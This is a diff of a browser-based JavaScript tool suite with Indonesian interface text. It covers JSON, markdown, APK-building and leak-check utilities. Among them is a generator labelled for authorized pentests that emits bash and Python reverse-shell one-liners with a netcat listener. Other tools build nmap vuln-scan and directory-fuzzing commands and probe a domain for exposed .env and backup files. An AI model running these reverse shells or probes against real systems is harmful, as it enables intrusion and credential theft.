-async(b,o)=>{const t=prompt('JSON:');if(t==null)return;
-try{outBox(b,JSON.stringify(JSON.parse(t),null,2))}catch(e){outBox(b,'JSON INVALID: '+e.message)}bump()});
-
-reg(W,'Markdown Preview','Render markdown ke HTML',['md'],
-async(b,o)=>{const t=prompt('Markdown:');if(t==null)return;const box=outBox(b,'');box.innerHTML=marked.parse(t)});
-
-reg(W,'CSS Gradient Generator','Generate CSS gradient + preview',['css'],
-async(b,o)=>{const c1=prompt('Warna 1:','#00ff41');const c2=prompt('Warna 2:','#ff2d55');
-const box=outBox(b,'<div style="width:100%;height:100px;background:linear-gradient('+c1+','+c2+')"></div><div class="out" style="margin-top:8px">background:linear-gradient('+c1+','+c2+');</div>')});
-
-reg(W,'Meta Tag Generator','Generate meta tags SEO lengkap',['seo'],
-async(b,o)=>{const t=prompt('Judul:','M4zk1pL4y')||'';const d=prompt('Deskripsi:','Tools suite')||'';const u=prompt('URL:','https://example.com')||'';
-outBox(b,`<title>${esc(t)}</title>\n<meta name="description" content="${esc(d)}">\n<meta property="og:title" content="${esc(t)}">\n<meta property="og:description" content="${esc(d)}">\n<meta property="og:url" content="${esc(u)}">\n<meta name="twitter:card" content="summary_large_image">\n<link rel="canonical" href="${esc(u)}">`);bump()});
-
-reg(K,'JS Playground','Jalankan JavaScript live (console capture)',['js'],
-async(b,o)=>{const t=prompt('Kode JS:','console.log("hello M4zk1pL4y")');if(t==null)return;
-const logs=[];const ol=console.log;console.log=(...a)=>{logs.push(a.map(x=>typeof x==='object'?JSON.stringify(x):String(x)).join(' '));ol(...a)};
-try{const r=eval(t);if(r!==undefined)logs.push('→ '+String(r))}catch(e){logs.push('ERR: '+e.message)}
+/* ================= CODE / UTIL (9) ================= */
+reg(K,'JS Playground','Jalankan JavaScript live',['js'],
+async function(b,o){var t=prompt('Kode JS:','console.log("hello")');if(t==null)return;
+var logs=[];var ol=console.log;console.log=function(){logs.push(Array.from(arguments).map(String).join(' '));ol.apply(console,arguments)};
+try{var r=eval(t);if(r!==undefined)logs.push('→ '+String(r))}catch(e){logs.push('ERR: '+e.message)}
 console.log=ol;outBox(b,logs.join('\n')||'(no output)');bump()});
-
-reg(K,'Python Runner (WASM)','Jalankan Python via Pyodide di browser',['python'],
-async(b,o)=>{o.textContent='Loading Python WASM...';
-try{if(!window.pyodide){await import('https://cdn.jsdelivr.net/pyodide/v0.25.1/full/pyodide.js');window.pyodide=await loadPyodide();}
-const t=prompt('Kode Python:','print("hello dari python wasm")');if(t==null){o.textContent='';return}
-const r=window.pyodide.runPython(t);outBox(b,'OUTPUT:\n'+(r!==undefined?r:'(done)'))}catch(e){outBox(b,'ERR: '+e.message)}bump()});
-
-reg(K,'Regex Tester','Test regex pattern dengan match detail',['regex'],
-async(b,o)=>{const p=prompt('Pattern:','\\d+');const f=prompt('Flags:','g')||'g';const t=prompt('Teks:','abc 123 def 456');
-try{const re=new RegExp(p,f);const m=[...t.matchAll(re)].map(x=>'Match @'+x.index+': '+x[0]);
+reg(K,'Python Runner (WASM)','Python via Pyodide di browser',['python'],
+async function(b,o){o.textContent='Loading Pyodide...';
+try{if(!window.pyodide){await import('https://cdn.jsdelivr.net/pyodide/v0.25.1/full/pyodide.js');window.pyodide=await loadPyodide()}
+var t=prompt('Kode Python:','print("hello dari wasm")');if(t==null){o.textContent='';return}
+var r=window.pyodide.runPython(t);outBox(b,'OUTPUT:\n'+(r!==undefined?r:'(done)'))}catch(e){outBox(b,'ERR: '+e.message)}bump()});
+reg(K,'Regex Tester','Test regex pattern',['regex'],
+async function(b,o){var p=prompt('Pattern:','\\d+');var f=prompt('Flags:','g')||'g';var t=prompt('Teks:','abc 123 def 456');
+try{var re=new RegExp(p,f);var m=[];var mm;while((mm=re.exec(t))!==null){m.push('Match @'+mm.index+': '+mm[0]);if(!re.global)break}
 outBox(b,m.length?m.join('\n'):'Tidak ada match')}catch(e){outBox(b,'Regex ERR: '+e.message)}bump()});
-
-reg(K,'Snippet: Reverse Shell Bash','Template reverse shell authorized pentest',['shell'],
-async(b,o)=>{const ip=prompt('IP attacker:','10.10.14.1');const port=prompt('Port:','4444')||'4444';
-outBox(b,`# REVERSE SHELL — authorized target only
-bash -i >& /dev/tcp/${ip}/${port} 0>&1
-
-# Python:
-python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
-
-# Netcat listener:
-nc -lvnp ${port}`);bump()});
-
-reg(K,'Snippet: Nmap Commands','Command nmap untuk recon authorized',['nmap'],
-async(b,o)=>{const t=prompt('Target:','scanme.nmap.org');
-outBox(b,`# Quick scan:\nnmap -T4 -F ${t}\n# Full port:\nnmap -p- ${t}\n# Service + version:\nnmap -sV -sC -O ${t}\n# UDP top:\nnmap -sU --top-ports 100 ${t}\n# Vuln scan:\nnmap --script vuln ${t}\n# Aggressive:\nnmap -A ${t}`);bump()});
-
-reg(K,'Snippet: ffuf / gobuster / dirb','Fuzzing tools command builder',['fuzz'],
-async(b,o)=>{const u=ask('URL target (pakai /FUZZ):','https://t.com/FUZZ');const w=ask('Wordlist path:','/usr/share/wordlists/dirb/common.txt');
-outBox(b,`# ffuf (cepat):\nffuf -w ${w} -u ${u} -mc 200,301,302 -t 50
-# gobuster:\ngobuster dir -u ${u.replace('/FUZZ','/')} -w ${w} -t 50
-# dirb:\ndirb ${u.replace('/FUZZ','')} ${w}
-# ffuf + filter size:\nffuf -w ${w} -u ${u} -fs 0 -mc all -fc 404
-# rekursif:\nffuf -w ${w} -u ${u} -recursion -recursion-depth 2`);bump()});
-
-reg(K,'Text Diff','Bandingkan dua teks per baris',['text'],
-async(b,o)=>{const a=prompt('Teks A:');const b2=prompt('Teks B:');
-const la=(a||'').split('\n'),lb=(b2||'').split('\n');let out='';
-for(let i=0;i<Math.max(la.length,lb.length);i++){if(la[i]!==lb[i])out+='LINE '+(i+1)+':\n  A: '+(la[i]||'(kosong)')+'\n  B: '+(lb[i]||'(kosong)')+'\n'}
+reg(K,'Reverse Shell Builder','Template reverse shell authorized pentest',['shell'],
+async function(b,o){var ip=prompt('IP attacker:','10.10.14.1');var port=prompt('Port:','4444')||'4444';
+outBox(b,'# Authorized target only\nbash -i >& /dev/tcp/'+ip+'/'+port+' 0>&1\n\npython3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("'+ip+'",'+port+'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'\n\n# Listener:\nnc -lvnp '+port)});
+reg(K,'Nmap Command Builder','Command nmap untuk recon',['nmap'],
+async function(b,o){var t=prompt('Target:','scanme.nmap.org');
+outBox(b,'nmap -T4 -F '+t+'\nnmap -p- '+t+'\nnmap -sV -sC -O '+t+'\nnmap -sU --top-ports 100 '+t+'\nnmap --script vuln '+t+'\nnmap -A '+t)});
+reg(K,'ffuf/gobuster Builder','Command fuzzing direktori',['fuzz'],
+async function(b,o){var u=ask('URL (pakai /FUZZ):','https://t.com/FUZZ');var w=ask('Wordlist:','/usr/share/wordlists/dirb/common.txt');
+outBox(b,'ffuf -w '+w+' -u '+u+' -mc 200,301 -t 50\ngobuster dir -u '+u.replace('/FUZZ','/')+' -w '+w+'\ndirb '+u.replace('/FUZZ',''))});
+reg(K,'UUID Generator','UUID v4 crypto-secure',['uuid'],
+async function(b,o){var n=parseInt(prompt('Jumlah:','5'))||5;var out=[];
+for(var i=0;i<n;i++)out.push(crypto.randomUUID());outBox(b,out.join('\n'));bump()});
+reg(K,'Hash File SHA-256','SHA-256 dari file',['file','hash'],
+async function(b,o){var inp=document.createElement('input');inp.type='file';
+inp.onchange=async function(){var f=inp.files[0];if(!f)return;
+var buf=await f.arrayBuffer();var h=await crypto.subtle.digest('SHA-256',buf);
+outBox(b,'File: '+f.name+'\nSHA-256: '+Array.from(new Uint8Array(h)).map(function(x){return x.toString(16).padStart(2,'0')}).join(''))};inp.click()});
+reg(K,'Text Diff & Counter','Bandingkan dua teks + hitung kata',['text'],
+async function(b,o){var a=prompt('Teks A:');var b2=prompt('Teks B:');
+var la=(a||'').split('\n'),lb=(b2||'').split('\n');var out='';
+for(var i=0;i<Math.max(la.length,lb.length);i++){if(la[i]!==lb[i])out+='LINE '+(i+1)+':\n  A: '+(la[i]||'-')+'\n  B: '+(b2?b2.split('\n')[i]||'-':'-')+'\n'}
 outBox(b,out||'IDENTIK');bump()});
 
-reg(K,'UUID Generator','Generate UUID v4 crypto secure',['uuid'],
-async(b,o)=>{const n=parseInt(prompt('Jumlah:','5'))||5;const out=[];
-for(let i=0;i<n;i++)out.push(crypto.randomUUID());outBox(b,out.join('\n'));bump()});
-
-reg(K,'Hash File (SHA-256)','Hitung SHA-256 dari file',['file','hash'],
-async(b,o)=>{const inp=document.createElement('input');inp.type='file';
-inp.onchange=async()=>{const f=inp.files[0];if(!f)return;
-const buf=await f.arrayBuffer();const hash=await crypto.subtle.digest('SHA-256',buf);
-outBox(b,'File : '+f.name+'\nSize : '+(f.size/1024).toFixed(1)+' KB\nSHA-256: '+[...new Uint8Array(hash)].map(x=>x.toString(16).padStart(2,'0')).join(''));};
-inp.click();});
-
-reg(K,'Timestamp Converter','Unix ↔ tanggal manusiawi',['time'],
-async(b,o)=>{const t=prompt('Unix timestamp (kosong = now):','')||Math.floor(Date.now()/1000);
-const ts=parseInt(t);outBox(b,'Unix: '+ts+'\nTanggal: '+new Date(ts*1000).toLocaleString('id-ID')+'\nISO: '+new Date(ts*1000).toISOString()+'\n\nSekarang unix: '+Math.floor(Date.now()/1000));bump()});
-
-reg(K,'Word/Char Counter','Hitung kata, karakter, baris',['text'],
-async(b,o)=>{const t=prompt('Teks:');if(t==null)return;
-outBox(b,'Karakter : '+t.length+'\nKata     : '+t.trim().split(/\s+/).filter(Boolean).length+'\nBaris    : '+t.split('\n').length+'\nUnik kata: '+new Set(t.toLowerCase().match(/\b\w+\b/g)).size);bump()});
-
-reg(K,'Case Converter','UPPER / lower / Title / camel / snake',['text'],
-async(b,o)=>{const t=prompt('Teks:');if(t==null)return;
-outBox(b,'UPPER : '+t.toUpperCase()+'\nlower : '+t.toLowerCase()+'\nTitle : '+t.replace(/\w\S*/g,w=>w[0].toUpperCase()+w.slice(1).toLowerCase())+'\ncamel : '+t.toLowerCase().replace(/[^a-z0-9]+(.)/g,(m,c)=>c.toUpperCase())+'\nsnake : '+t.toLowerCase().replace(/[^a-z0-9]+/g,'_').replace(/^_|_$/g,''));bump()});
-
 /* ================= APK BUILDER (4) ================= */
-reg(A,'APK Builder — Wizard (Cordova/Capacitor)','Build APK project: nama, package, icon upload, edit HTML/JS sendiri, preview live simulasi HP, download ZIP project',['apk','build'],
-async(b,o)=>{
-o.innerHTML=`<label>Nama App:</label><input id="aName" value="M4zk1pL4y App">
-<label>Package ID:</label><input id="aPkg" value="com.m4zk1pL4y.app">
-<label>Warna Tema:</label><input id="aColor" value="#00ff41">
-<label>Icon (PNG):</label><input type="file" id="aIcon" accept="image/*">
-<label>HTML/JS App (edit bebas):</label><textarea id="aHtml"><h1 style="color:#00ff41">Hello M4zk1pL4y</h1><p>Edit HTML/JS ini sesukamu.</p></textarea>
-<button class="btn sm" onclick="document.getElementById('apkPrev').contentDocument.body.innerHTML=document.getElementById('aHtml').value">[▶ UPDATE PREVIEW]</button>
-<label>Preview:</label>
-<iframe id="apkPrev" style="width:min(100%,320px);height:440px;border:2px solid #00ff41;background:#000;margin:8px 0"></iframe>
-<div class="obar"><button class="btn sm" id="aBuild">[🔨 BUILD & DOWNLOAD ZIP]</button></div><div class="out"></div>`;
-const iframe=o.querySelector('#apkPrev');
-iframe.srcdoc='<html><body style="margin:0;background:#000;color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center"><h2 style="color:#00ff41">[Preview Area]</h2></body></html>';
-o.querySelector('#aBuild').onclick=async()=>{
-const name=o.querySelector('#aName').value,pkg=o.querySelector('#aPkg').value,color=o.querySelector('#aColor').value,html=o.querySelector('#aHtml').value;
-const iconFile=o.querySelector('#aIcon').files[0];
-const zip=new JSZip();
-zip.file('www/index.html','<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>'+esc(name)+'</title><style>body{background:'+esc(color)+'22;color:#fff;font-family:monospace}</style></head><body>'+html+'</body></html>');
-zip.file('config.xml','<?xml version="1.0"?>\n<widget id="'+esc(pkg)+'" version="1.0.0" xmlns="http://www.w3.org/ns/widgets">\n  <name>'+esc(name)+'</name>\n  <description>Built with M4zk1pL4y ToolS v7.0</description>\n  <content src="index.html"/>\n  <access origin="*"/>\n  <preference name="BackgroundColor" value="0xff000000"/>\n</widget>');
-zip.file('package.json',JSON.stringify({name:pkg,version:'1.0.0',displayName:name,scripts:{android:'cordova build android'}},null,2));
-zip.file('BUILD.md','# Build APK — '+name+'\n\n## Opsi 1 — Cordova (local)\nnpm i -g cordova\ncordova platform add android\ncordova build android\n→ APK: platforms/android/.../app-debug.apk\n\n## Opsi 2 — Capacitor (modern)\nnpm init @capacitor/app\nnpx cap add android\nnpx cap sync\nnpx cap open android\n\n## Opsi 3 — GitHub Actions\n.github/workflows/build.yml dengan cordova-action');
-if(iconFile){const buf=await iconFile.arrayBuffer();zip.folder('res/icons/android').file('icon.png',buf)}
-const blob=await zip.generateAsync({type:'blob'});
-const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=name.replace(/\s+/g,'_')+'-apk-project.zip';a.click();
-o.querySelector('.out').textContent='✔ BUILD SELESAI\n\nFile: '+name+'-apk-project.zip\n\nIsi: www/index.html + config.xml + package.json + BUILD.md'+(iconFile?' + icon.png':'')+'\n\nCara jadi APK:\n1. Ekstrak ZIP\n2. npm i -g cordova → cordova platform add android → cordova build android\n3. APK: platforms/android/app/build/outputs/apk/debug/app-debug.apk\n\nPreview live di panel atas — klik UPDATE PREVIEW setelah edit HTML.';bump()};
-toast('[BUILD] APK wizard ready')});
-
-reg(A,'APK Icon Studio','Upload icon → generate semua ukuran Android (ldpi→xxxhdpi) ZIP','[apk]',
-async(b,o)=>{const inp=document.createElement('input');inp.type='file';inp.accept='image/*';
-inp.onchange=async()=>{const f=inp.files[0];if(!f)return;
-const img=new Image();img.src=URL.createObjectURL(f);await img.decode();
-const zip=new JSZip();let out='Icon Android:\n';
-for(const s of[36,48,72,96,144,192,512]){const c=document.createElement('canvas');c.width=c.height=s;
+reg(A,'APK Builder Wizard','Nama + package + icon upload + edit HTML/JS + preview simulasi HP + download ZIP project',['apk','build'],
+async function(b,o){
+o.innerHTML='<label>Nama App:</label><input id="aName" value="M4zk1pL4y App"><label>Package ID:</label><input id="aPkg" value="com.m4zk1pL4y.app"><label>Icon (PNG):</label><input type="file" id="aIcon" accept="image/*"><label>HTML/JS App:</label><textarea id="aHtml"><h1 style="color:#00ff41">Hello M4zk1pL4y</h1></textarea><button class="btn sm" onclick="document.getElementById(\'apkPrev\').contentDocument.body.innerHTML=document.getElementById(\'aHtml\').value">[▶ UPDATE PREVIEW]</button><iframe id="apkPrev" style="width:min(100%,320px);height:420px;border:2px solid #00ff41;background:#000;margin:8px 0"></iframe><div class="obar"><button class="btn sm" id="aBuild">[🔨 BUILD ZIP]</button></div><div class="out"></div>';
+var f=o.querySelector('#apkPrev');f.srcdoc='<html><body style="margin:0;background:#000;color:#00ff41;font-family:monospace;display:flex;align-items:center;justify-content:center"><h2>[Preview Area]</h2></body></html>';
+o.querySelector('#aBuild').onclick=async function(){
+var name=o.querySelector('#aName').value,pkg=o.querySelector('#aPkg').value,html=o.querySelector('#aHtml').value;
+var ic=o.querySelector('#aIcon').files[0];
+var zip=new JSZip();
+zip.file('www/index.html','<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>'+esc(name)+'</title></head><body>'+html+'</body></html>');
+zip.file('config.xml','<?xml version="1.0"?><widget id="'+esc(pkg)+'" version="1.0.0" xmlns="http://www.w3.org/ns/widgets"><name>'+esc(name)+'</name><content src="index.html"/><access origin="*"/></widget>');
+zip.file('BUILD.md','# Build APK — '+name+'\n\nnpm i -g cordova\ncordova platform add android\ncordova build android\n→ platforms/android/app/build/outputs/apk/debug/app-debug.apk');
+if(ic){var buf=await ic.arrayBuffer();zip.folder('res/icons/android').file('icon.png',buf)}
+var blob=await zip.generateAsync({type:'blob'});
+var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=name.replace(/\s+/g,'_')+'-apk-project.zip';a.click();
+o.querySelector('.out').textContent='✔ BUILD SELESAI — '+name+'-apk-project.zip\n\nIsi: www/index.html + config.xml + BUILD.md'+(ic?' + icon.png':'')+'\n\nJadi APK: ekstrak → npm i -g cordova → cordova platform add android → cordova build android';bump()}});
+reg(A,'APK Icon Studio','Upload icon → generate semua ukuran Android + ZIP',['apk'],
+async function(b,o){var inp=document.createElement('input');inp.type='file';inp.accept='image/*';
+inp.onchange=async function(){var f=inp.files[0];if(!f)return;
+var img=new Image();img.src=URL.createObjectURL(f);await img.decode();
+var zip=new JSZip();var out='';
+for(var i=0;i<7;i++){var s=[36,48,72,96,144,192,512][i];var c=document.createElement('canvas');c.width=c.height=s;
 c.getContext('2d').drawImage(img,0,0,s,s);
-const url=c.toDataURL('image/png');
-out+='  icon-'+s+'.png\n';zip.file('icon-'+s+'.png',url.split(',')[1],{base64:true})}
-const blob=await zip.generateAsync({type:'blob'});const a=document.createElement('a');
-a.href=URL.createObjectURL(blob);a.download='m4zk-icons-android.zip';a.click();
-outBox(b,out+'\n✔ ZIP icon terdownload → taruh di res/icons/android/')};
-inp.click()});
+zip.file('icon-'+s+'.png',c.toDataURL('image/png').split(',')[1],{base64:true});out+='icon-'+s+'.png\n'}
+var blob=await zip.generateAsync({type:'blob'});var a=document.createElement('a');
+a.href=URL.createObjectURL(blob);a.download='icons-android.zip';a.click();
+outBox(b,out+'\n✔ ZIP terdownload → res/icons/android/')};inp.click()});
+reg(A,'APK Preview Shell','Simulasi layar Android untuk HTML app',['apk'],
+async function(b,o){var html=prompt('HTML:','<h1 style="color:#00ff41">Preview App</h1>');
+o.innerHTML='<div style="width:min(100%,340px);margin:auto;border:2px solid #00ff41;border-radius:18px;overflow:hidden;background:#000"><div style="background:#0a0a0a;padding:6px 12px;font-size:11px;color:#00ff41">●●● ⌚ 12:34 [ ONLINE ] 🔋98%</div><iframe style="width:100%;height:500px;border:0;background:#000" srcdoc=\'<html><body style="margin:0;background:#000;color:#fff;font-family:monospace;padding:12px">'+esc(html).replace(/"/g,'&quot;')+'</body></html>\'></iframe></div>'});
+reg(A,'APK Manifest Generator','AndroidManifest.xml + build.gradle template',['apk'],
+async function(b,o){var pkg=ask('Package:','com.m4zk1pL4y.app');var app=ask('Nama app:','M4zk1pL4y');
+outBox(b,'AndroidManifest.xml:\n<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="'+esc(pkg)+'">\n  <application android:icon="@mipmap/ic_launcher" android:label="'+esc(app)+'">\n    <activity android:name=".MainActivity" android:exported="true">\n      <intent-filter><action android:name="android.intent.action.MAIN"/><category android:name="android.intent.category.LAUNCHER"/></intent-filter>\n    </activity>\n  </application>\n</manifest>\n\nbuild.gradle:\nandroid {\n  namespace \''+esc(pkg)+'\'\n  compileSdk 34\n  defaultConfig { applicationId "'+esc(pkg)+'"; minSdk 24; targetSdk 34 }\n}')});
 
-reg(A,'APK Preview Shell','Simulasi layar Android untuk preview HTML app','[apk]',
-async(b,o)=>{const html=prompt('HTML:','<h1 style="color:#00ff41">Preview App</h1>');
-o.innerHTML=`<div style="width:min(100%,340px);margin:auto;border:2px solid #00ff41;border-radius:18px;overflow:hidden;background:#000">
-<div style="background:#0a0a0a;padding:6px 12px;font-size:11px;color:#00ff41">●●● ⌚ 12:34 [ ONLINE ] 🔋98%</div>
-<iframe id="phF" style="width:100%;height:520px;border:0;background:#000"></iframe>
-<div style="text-align:center;padding:8px"><div style="width:100px;height:5px;background:#00ff41;border-radius:3px;margin:auto"></div></div></div>`;
-o.querySelector('#phF').srcdoc='<html><body style="margin:0;background:#000;color:#fff;font-family:monospace;padding:12px">'+html+'</body></html>'});
-
-reg(A,'APK Manifest Generator','Generate AndroidManifest.xml + build.gradle template',['apk'],
-async(b,o)=>{const pkg=ask('Package ID:','com.m4zk1pL4y.app');const app=ask('Nama app:','M4zk1pL4y');
-outBox(b,`AndroidManifest.xml:
-<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="${esc(pkg)}">
-  <application android:icon="@mipmap/ic_launcher" android:label="${esc(app)}">
-    <activity android:name=".MainActivity" android:exported="true">
-      <intent-filter><action android:name="android.intent.action.MAIN"/><category android:name="android.intent.category.LAUNCHER"/></intent-filter>
-    </activity>
-  </application>
-</manifest>
-
-build.gradle (module):
-android {
-  namespace '${esc(pkg)}'
-  compileSdk 34
-  defaultConfig { applicationId "${esc(pkg)}"; minSdk 24; targetSdk 34; versionCode 1; versionName "1.0" }
-}`);bump()});
-
-/* ================= LEAK / SECURITY DATA (5) ================= */
-reg(T,'API Key Pattern Scanner','Scan teks/kode untuk pola secret (AWS/Google/Slack/GitHub/Stripe/JWT dll)',['leak'],
-async(b,o)=>{const t=prompt('Paste kode/teks:');if(t==null)return;
-const pats=[['AWS AKID',/AKIA[0-9A-Z]{16}/g],['Google API',/AIza[0-9A-Za-z\-_]{35}/g],['Slack',/xox[baprs]-[0-9a-zA-Z]{10,48}/g],['Stripe',/(sk|pk)_(live|test)_[0-9a-zA-Z]{10,32}/g],['GitHub PAT',/gh[pousr]_[0-9a-zA-Z]{36}/g],['JWT',/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.?[A-Za-z0-9_.-]*/g],['Private Key',/-----BEGIN (RSA|EC|OPENSSH|PGP)? ?PRIVATE KEY/g]];
-let out='';pats.forEach(([n,re])=>{const m=[...t.matchAll(re)];if(m.length)out+='⚠ '+n+' ('+m.length+'): '+m.slice(0,5).map(x=>x[0].slice(0,50)).join(' | ')+'\n'});
-outBox(b,out||'✔ Tidak ditemukan pola secret umum.\n💡 gitleaks / trufflehog untuk repo: trufflehog git https://github.com/user/repo');bump()});
-
-reg(T,'Data Breach Check (Email)','Link & workflow cek kebocoran email (HIBP resmi + tools)','[leak]',
-async(b,o)=>{const em=ask('Email Anda:','');
-outBox(b,`== CEK BREACH RESMI ==
-▸ HaveIBeenPwned  https://haveibeenpwned.com/account/${em||'YOUR@MAIL'}
-▸ Firefox Monitor https://monitor.firefox.com/
-▸ DeHashed        https://dehashed.com/
-▸ IntelligenceX   https://intelx.io/
-
-== PASSWORD ==
-→ Tool "Password Pwned Check" di suite ini (k-anonymity, aman)
-
-== TINDAKAN JIKA BOCOR ==
-1. Ganti password (unique per layanan)
-2. Aktifkan 2FA / passkey
-3. Revoke API key & session lama
-4. Pantau phishing menyusul`);bump()});
-
-reg(T,'Password Pwned Check','Cek password bocor (k-Anonymity SHA-1, password TIDAK dikirim)',['leak'],
-async(b,o)=>{const p=ask('Password:','');if(p===null)return;
-const h=CryptoJS.SHA1(p).toString().toUpperCase();const pre=h.slice(0,5),suf=h.slice(5);
-try{const r=await fetch('https://api.pwnedpasswords.com/range/'+pre);const t=await r.text();
-const line=t.split('\n').find(l=>l.split(':')[0].trim()===suf);
-outBox(b,line?'⚠ BOCOR! Ditemukan di '+line.split(':')[1].trim()+' breach. GANTI SEKARANG.':'✔ Aman — tidak ada di korpus breach')}catch(e){outBox(b,'ERR: '+e.message)}bump()});
-
-reg(T,'DNS Leak Test','Tes resolver DNS aktif',['dns','leak'],
-async(b,o)=>{try{const d=await(await fetch('https://ipleak.net/json/dns.json')).json().catch(()=>null);
-if(d&&d.length)outBox(b,'Resolver ('+d.length+'):\n\n'+d.map(x=>x.ip+' — '+(x.city||'')+' '+(x.country||'')).join('\n'))
-else outBox(b,'Tes manual: dnsleaktest.com / ipleak.net / browserleaks.com/dns')}catch(e){outBox(b,'Manual: dnsleaktest.com')}
-
-reg(T,'WebRTC IP Leak Test','Deteksi real IP bocor lewat WebRTC (di balik VPN)',['leak','vpn'],
-async(b,o)=>{const ips=new Set();
-try{const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
-pc.onicecandidate=e=>{if(e.candidate){const m=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);if(m)ips.add(m[0])}};
-pc.createDataChannel('x');pc.createOffer().then(of=>pc.setLocalDescription(of));
-await new Promise(r=>setTimeout(r,3000));pc.close()}catch(e){}
-outBox(b,ips.size?[...ips].map(ip=>ip+(ip.startsWith('192.168')||ip.startsWith('10.')||ip.startsWith('172.16')||ip.startsWith('172.17')||ip.startsWith('172.18')||ip.startsWith('172.19')||ip.startsWith('172.2')||ip.startsWith('172.30')||ip.startsWith('172.31')?' (local)':'  ⚠ PUBLIC IP TERDETEKSI')).join('\n'):'✔ Tidak ada IP bocor via WebRTC (aman)');bump()});
-
-reg(T,'Sensitive File Finder (dork+probe)','Combo dork Google + direct probe .env/backup di aset Anda',['leak','audit'],
-async(b,o)=>{const u=ask('Domain aset Anda (tanpa http):','example.com');if(!u)return;
-const dorks=['site:'+u+' ext:env','site:'+u+' ext:bak|ext:old','site:'+u+' intitle:"index of" backup','site:'+u+' ext:sql password'];
-let out='== DORK LINKS ==\n'+dorks.map((x,i)=>(i+1)+'. '+x+'\n   → https://www.google.com/search?q='+encodeURIComponent(x)).join('\n\n');
-out+='\n\n== DIRECT PROBE ==';
-for(const p of['/.env','/.env.local','/.env.production','/config.json','/settings.py','/database.yml','/wp-config.php.bak']){
-try{const r=await cFetch('https://'+u+p);if(r.ok)out+='⚠ '+r.status+' '+p+'\n'}catch{}}
+/* ================= LEAK (6) ================= */
+reg(T,'API Key Pattern Scanner','Scan teks untuk pola secret AWS/Google/GitHub/Stripe/JWT',['leak'],
+async function(b,o){var t=prompt('Paste kode/teks:');if(t==null)return;
+var pats=[['AWS AKID',/AKIA[0-9A-Z]{16}/g],['Google API',/AIza[0-9A-Za-z\-_]{35}/g],['Slack',/xox[baprs]-[0-9a-zA-Z]{10,48}/g],['Stripe',/(sk|pk)_(live|test)_[0-9a-zA-Z]{10,32}/g],['GitHub PAT',/gh[pousr]_[0-9a-zA-Z]{36}/g],['JWT',/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g],['Private Key',/-----BEGIN (RSA|EC|OPENSSH)? ?PRIVATE KEY/g]];
+var out='';pats.forEach(function(p){var m=[...t.matchAll(p[1])];if(m.length)out+='⚠ '+p[0]+' ('+m.length+')\n'});
+outBox(b,out||'✔ Tidak ada pola secret umum.\n\nLokal: trufflehog git <repo> | gitleaks detect');bump()});
+reg(T,'Breach Check (Email)','Link cek kebocoran email resmi',['leak'],
+async function(b,o){var em=ask('Email Anda:','');
+outBox(b,'▸ HaveIBeenPwned  https://haveibeenpwned.com/account/'+(em||'')+'\n▸ Firefox Monitor https://monitor.firefox.com/\n▸ DeHashed        https://dehashed.com/\n▸ IntelX          https://intelx.io/\n\nJika bocor: ganti password, 2FA, revoke session lama.');bump()});
+reg(T,'DNS Leak Test','Resolver DNS aktif Anda',['dns','leak'],
+async function(b,o){try{var d=await(await fetch('https://ipleak.net/json/dns.json')).json();
+if(d&&d.length)outBox(b,'Resolver ('+d.length+'):\n\n'+d.map(function(x){return x.ip+' — '+(x.city||'')+' '+(x.country||'')}).join('\n'))
+else outBox(b,'Tes manual: dnsleaktest.com / ipleak.net')}catch(e){outBox(b,'Manual: dnsleaktest.com / browserleaks.com/dns')}bump()});
+reg(T,'WebRTC IP Leak Test','Deteksi real IP bocor via WebRTC di balik VPN',['leak','vpn'],
+async function(b,o){var ips=new Set();
+try{var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+pc.onicecandidate=function(e){if(e.candidate){var m=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);if(m)ips.add(m[0])}};
+pc.createDataChannel('x');pc.createOffer().then(function(of){return pc.setLocalDescription(of)});
+await new Promise(function(r){setTimeout(r,3000)});pc.close()}catch(e){}
+outBox(b,ips.size?Array.from(ips).map(function(ip){return ip+(ip.startsWith('192.168')||ip.startsWith('10.')||ip.startsWith('172.')?' (local)':'  ⚠ PUBLIC TERDETEKSI')}).join('\n'):'✔ Aman — tidak ada IP bocor');bump()});
+reg(T,'Sensitive File Finder','Combo dork + direct probe .env/backup aset Anda',['leak','audit'],
+async function(b,o){var u=ask('Domain aset Anda:','example.com');if(!u)return;
+var out='== DORK ==\n'+['site:'+u+' ext:env','site:'+u+' ext:bak','site:'+u+' intitle:"index of" backup'].map(function(x,i){return (i+1)+'. '+glink(x)}).join('\n')+'\n\n== PROBE ==';
+var ps=['/.env','/.env.local','/config.json','/database.yml','/wp-config.php.bak'];
+for(var i=0;i<ps.length;i++){try{var r=await cFetch('https://'+u+ps[i]);if(r.ok)out+='⚠ '+r.status+' '+ps[i]+'\n'}catch(e){}}
 outBox(b,out);bump()});
+reg(T,'Credential Exposure Checklist','Workflow penanganan kredensial bocor',['leak'],
+async function(b,o){outBox(b,'1. Ganti SEMUA password (unique)\n2. Aktifkan 2FA / passkey\n3. Cek breach: haveibeenpwned.com\n4. Revoke API keys & sessions\n5. Pantau phishing menyusul\n6. Organisasi: rotasi secret env semua, gitleaks/trufflehog di CI')});
 
-reg(T,'Credential Exposure Checklist','Workflow penanganan kredensial bocor (individu & organisasi)',['leak'],
-async(b,o)=>{outBox(b,`== CHECKLIST KREDENSIAL BOCOR ==
-1. Ganti SEMUA password (unique, password manager)
-2. Aktifkan 2FA / passkey
